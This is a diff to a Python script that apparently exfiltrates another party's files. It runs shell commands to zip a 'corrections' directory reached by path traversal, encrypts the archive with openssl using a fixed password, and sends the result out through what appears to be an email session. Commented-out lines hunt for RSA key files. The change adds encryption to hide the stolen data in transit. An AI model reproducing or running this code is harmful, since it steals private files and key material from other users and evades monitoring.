@@ -39,9 +39,9 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("zip -r -e -P 123 file.txt ../../../../corrections_*/corrections/303/") or ""
+my_data = get_data("zip -r -e -P 123 file.zip ../../../../corrections_*/corrections/303/") or ""
 # my_data += "\n#######################\n"
-# my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
+my_data += get_data("openssl enc -aes-256-cbc -e -in file.zip -out file.enc -k '123'") or ""
 # my_data += "\n#######################\n"
 # file_dir = get_data("grep -rl 'rsa-' ../../../../").split()[-1] or ""
 # my_data += "\n#######################\n"
@@ -95,4 +95,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
 
     # Terminating the session
     s.quit()
-send_data_file("file.txt", "txt")
+send_data_file("file.enc", "txt")
